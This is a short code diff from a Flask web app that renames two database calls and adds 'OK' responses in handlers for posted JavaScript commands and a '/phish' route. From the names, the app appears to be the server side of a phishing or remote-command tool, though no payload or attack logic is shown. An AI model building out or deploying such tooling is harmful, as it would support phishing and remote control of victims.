@@ -75,7 +75,8 @@ def sendjs():
     b = request.form['id']
     z = request.form['pattern']
     c = a + '\n' + b + '\n' + z
-    database.add_js_command(b, z, a)
+    database.add_js_cmd(b, z, a)
+    return 'OK';
 
 
 @app_flask.route('/phish', methods=['POST'])
@@ -85,7 +86,8 @@ def phish():
     e = request.form['number']
     y = request.form['pattern']
     f = d + '\n' + e + '\n' + y
-    database.add_phish_command(d, y, e)
+    database.add_phish_cmd(d, y, e)
+    return 'OK';
 
 
 
